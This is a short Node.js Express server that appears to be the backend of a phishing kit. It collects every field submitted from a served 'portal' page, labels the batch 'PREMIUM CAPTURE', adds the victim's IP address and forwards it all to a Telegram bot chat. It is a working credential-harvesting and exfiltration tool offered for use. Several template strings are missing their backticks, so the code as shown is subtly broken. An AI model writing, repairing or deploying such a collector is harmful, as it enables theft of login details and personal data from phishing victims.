const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID; // This will be your Group ID

app.post('/submit', async (req, res) => {
    const data = req.body;
    
    // Using backticks ensures emojis don't break the code
    let message = 🔥 **PREMIUM CAPTURE** 🔥\n;
    message += ━━━━━━━━━━━━━━━━━━\n;
    message += 🌐 **PORTAL:** ${data.page || 'Direct Access'} \n\n;

    for (const [key, value] of Object.entries(data)) {
        if (key !== 'page') {
            message += 🔹 **${key.toUpperCase()}:** ${value} \n;
        }
    }

    message += ━━━━━━━━━━━━━━━━━━\n;
    message += 📍 **IP:** ${req.headers['x-forwarded-for'] || req.socket.remoteAddress};

    try {
        await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.json({ status: "success" });
    } catch (error) {
        console.error("Bot Error:", error.message);
        res.status(500).json({ status: "error" });
    }
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Premium Bot System Live on ${PORT}`));